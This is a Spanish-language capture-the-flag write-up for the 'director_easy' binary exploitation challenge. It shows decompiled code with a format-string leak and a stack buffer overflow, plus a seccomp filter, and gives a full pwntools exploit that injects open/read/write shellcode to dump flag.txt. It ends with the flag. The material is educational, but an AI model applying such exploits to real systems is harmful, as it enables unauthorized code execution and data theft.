# Metared Cine Festival

```
 checksec director_easy
[*] '/home/kalcast/Descargas/pwn1/director_easy'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

El programa nos brinda dos entradas por medio de `read`.

La primera tiene una vulnerabilidad de cadena formateada:
```C
  local_10 = read(0,local_98,127);
  if (0 < local_10) {
    local_98[local_10] = '\0';
  }
  printf("\n>> You entered:");
  printf(local_98);
```

La segunda tiene un buffer overflow:
```C
  undefined local_118 [128];
  char local_98 [136];
  ssize_t local_10;
  ...
  printf("Step 2/2: Movie Plot Summary\n>> Input:");
  read(0,local_118,0x400);
```

El programa usa `seccomp` para bloquear dos syscalls: `execve` y `execvat`:
```C
void setup_seccomp(void)

{
  int iVar1;
  long lVar2;
  
  lVar2 = seccomp_init(0x7fff0000);
  if (lVar2 == 0) {
    perror("seccomp_init");
                    /* WARNING: Subroutine does not return * /
    exit(1);
  }
  seccomp_rule_add(lVar2,0,0x3b,0);
  seccomp_rule_add(lVar2,0,0x142,0);
  iVar1 = seccomp_load(lVar2);
  if (iVar1 < 0) {
    perror("seccomp_load");
    seccomp_release(lVar2);
                    /* WARNING: Subroutine does not return * /
    exit(1);
  }
  seccomp_release(lVar2);
  return;
}
```

<img width="1333" height="71" alt="2025-12-06-125359_1333x71_scrot" src="https://github.com/user-attachments/assets/466afef6-2c79-44cc-8458-5ff40f6dbac8" />
<img width="1346" height="133" alt="2025-12-06-125348_1346x133_scrot" src="https://github.com/user-attachments/assets/b84ec079-7ad0-4369-9c5d-02a0b816a934" />

Con la primera entrada podemos filtrar una dirección del stack y calcular la dirección de nuestra segunda entrada, donde insertaremos shellcode dado que el stack es ejecutable.

Tenemos que usar `open`, `read`, `write` y `exit` para leer el contenido de "flag.txt":

```py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./director_easy")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "challs.ctf.cert.unlp.edu.ar"
port = 42246

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
        # you need r.interactive() !
    else:
        return process([elf.path])
r = start()

# rop = ROP(elf)
# rop = ROP(elf, libc)
# rop = ROP(elf, libc, ld)

#========= exploit here ===================
r.sendlineafter(b"Input:",b"%p")
r.recvuntil(b"entered:")
leak = int(r.recvline().strip(),16)

stack_base = leak -  0x1f320
shellcode_addr = leak + 0x1b0

r.info("shellcode address: " + hex(shellcode_addr))

# 1. open("flag.txt", O_RDONLY)
sc = shellcraft.open(b"flag.txt", 0)
# 2. read(fd, buf, 100)
sc += shellcraft.read("rax", "rsp", 100)
# 3. write(1, buf, nbytes)
sc += shellcraft.write(1, "rsp", 100)
# 4. exit(0)
sc += shellcraft.exit(0)

payload = asm(sc)
payload += b"A" * (280 - len(payload))
payload += p64(shellcode_addr)

r.sendlineafter(b"Input:",payload)
r.interactive()
```

`UNLP{s0-ur_Th3-next-T4r4nt1n0?}`

